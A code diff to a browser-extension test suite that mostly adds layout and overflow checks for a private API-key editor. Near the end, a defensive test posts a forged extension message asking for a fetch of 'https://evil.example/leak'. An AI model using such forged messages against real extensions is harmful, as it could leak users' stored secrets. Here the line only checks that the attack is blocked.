@@ -119,16 +119,20 @@ try {
     await fill('.parameter-row input[id^=parameter-key]', 'api_key');await fill('.parameter-row input[id^=parameter-value]', secret);
     for (const width of [1000, 375]) for (const theme of ['light', 'dark']) {
         await setViewport({ width, height: 900 });await inside(value => { document.documentElement.dataset.theme = value; }, theme);
-        const fit = await inside(() => ({ width: innerWidth, overflow: document.documentElement.scrollWidth > innerWidth, hidden: document.querySelector('.parameter-row input[type=password]')?.value.length > 0 }));assert(!fit.overflow);assert(fit.hidden);
+        const fit = await inside(() => ({ width: innerWidth, overflow: document.documentElement.scrollWidth > innerWidth, fieldsOverflow:document.getElementById('editor-fields').scrollWidth>document.getElementById('editor-fields').clientWidth, hidden: document.querySelector('.parameter-row input[type=password]')?.value.length > 0 }));assert(!fit.overflow);assert(!fit.fieldsOverflow,`private fields overflow: ${JSON.stringify(fit)}`);assert(fit.hidden);
         if (shots) { await mkdir(shots, { recursive: true });await shot('options', path.join(shots, `private-${kind}-editor-${width}-${theme}.png`)); }
         await click('editor', '#private-access-help > summary');
         await inside(() => document.getElementById('private-access-help').scrollIntoView({ block:'center' }));
-        assert(await inside(() => document.documentElement.scrollWidth <= innerWidth), 'approval help fits the editor');
+        const helpFit=await inside(()=>{
+            const area=document.getElementById('editor-fields');
+            return {root:document.documentElement.scrollWidth<=innerWidth,available:area.clientWidth,content:area.scrollWidth,
+                wide:[...area.querySelectorAll('p,fieldset,details')].filter(item=>item.scrollWidth>item.clientWidth).map(item=>({tag:item.tagName,id:item.id,available:item.clientWidth,content:item.scrollWidth}))};
+        });assert(helpFit.root&&helpFit.content<=helpFit.available,`approval help fits the editor: ${JSON.stringify(helpFit)}`);
         if (shots) await shot('options', path.join(shots, `private-${kind}-help-${width}-${theme}.png`));
         await click('editor', '#private-access-help > summary');
     }
     await inside(() => { document.documentElement.dataset.verificationSave = 'hold';document.getElementById('save').scrollIntoView({ block: 'center', behavior: 'instant' }); });
-    const geometry = () => inside(() => Object.fromEntries(['save', 'test', 'cancel', 'private-parameters'].map(id => { const r = document.getElementById(id).getBoundingClientRect();return [id, [r.x, r.y, r.width, r.height]]; }).concat([['scroll', [scrollY]], ['focus', [document.activeElement?.id === 'save' ? 1 : 0]]])));
+    const geometry = () => inside(() => Object.fromEntries(['save', 'test', 'cancel', 'private-parameters'].map(id => { const r = document.getElementById(id).getBoundingClientRect();return [id, [r.x, r.y, r.width, r.height]]; }).concat([['scroll', [document.getElementById('editor-fields').scrollTop]], ['focus', [document.activeElement?.id === 'save' ? 1 : 0]]])));
     await inside(() => document.getElementById('save').focus({ preventScroll: true }));const anchored = await geometry();
     const stable = async () => { const after = await geometry();for (const key of Object.keys(anchored)) for (const [index, value] of after[key].entries()) assert(Math.abs(value - anchored[key][index]) <= 1, `private Save ${key} moved`);assert.equal(after.focus[0], 1); };
     for (const outcome of ['error', 'success']) {
@@ -207,6 +211,7 @@ try {
     assert(!await evaluate(value => document.documentElement.outerHTML.includes(value) || window.privateMessages.some(text => text.includes(value)), secret), 'secret appeared in Peakbagger DOM or messages');
     // Malicious MAIN messages can request only stored resources, never a URL or
     // a different document's secret. Synthetic events cannot open approval.
+    await waitForCondition(() => ({ quietMs:performance.now()-lastProviderRequest }),{description:'private provider idle after 2D tiles',isReady:value=>value.quietMs>=500});
     const before = requests.length;await evaluate(() => {
         const row = document.querySelector('[data-bpb-private-layer]');row.dispatchEvent(new MouseEvent('click', { bubbles: true }));
         window.postMessage({ __bpbCustomOverlays: true, dir: 'toCS', type: 'privateGet', message: { requestId: 'forged', id: row.dataset.bpbPrivateLayer, revision: Number(row.dataset.revision), resource: 'fetch', url: 'https://evil.example/leak' } }, location.origin);
